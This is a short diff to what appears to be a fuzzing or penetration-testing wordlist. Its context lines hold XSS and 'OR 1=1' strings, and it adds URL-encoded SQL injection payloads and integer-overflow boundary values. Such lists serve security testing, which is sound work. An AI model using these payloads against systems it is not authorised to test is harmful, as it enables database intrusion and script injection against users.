@@ -6,3 +6,11 @@ OR 1=1
 '';!--"<XSS>=&{()}
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+0x80000000
+0xfffffffe
+0xffffffff
+0x10000
+0x100000
